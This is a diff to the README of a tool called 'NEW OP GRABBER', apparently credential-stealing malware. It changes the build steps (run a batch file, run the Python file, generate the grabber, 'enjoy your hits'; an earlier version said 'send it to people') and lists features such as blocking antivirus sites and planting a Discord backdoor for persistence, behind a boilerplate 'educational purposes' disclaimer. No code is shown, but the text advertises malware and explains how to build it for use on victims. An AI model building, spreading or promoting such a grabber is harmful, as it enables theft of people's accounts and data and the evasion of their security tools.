@@ -6,6 +6,17 @@ NEW OP GRABBER
 
 Disclaimer: This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
+Requirements
+
+To build the stub, you need:
+
+Windows 10.
+
+Python 3.10+.
+
+An active internet connection.
+
+
 HOW TO DOWNLOAD:
 
 
@@ -13,11 +24,11 @@ Steps:
 
 FIRST DOWNLOAD THE FOLDER
 
-Step 1, run builder.bat
+Step 1, run requirements.bat
 
-Step 2, generate the grabber
+Step 2, run the python file via CMD prompt
 
-Step 3, send it to people
+Step 3, Generate your grabber
 
 step 4, enjoy your hits
 
@@ -89,12 +100,7 @@ Block AV Sites	Blocks AV related sites (Unblock).
 Discord Injection	Puts backdoor on the Discord client for persistence.
 Supports: Windows OS (Tested on Windows 10).
 
-Requirements
-To build the stub, you need:
 
-Windows 10.
-Python 3.10+.
-An active internet connection.
 
 
 
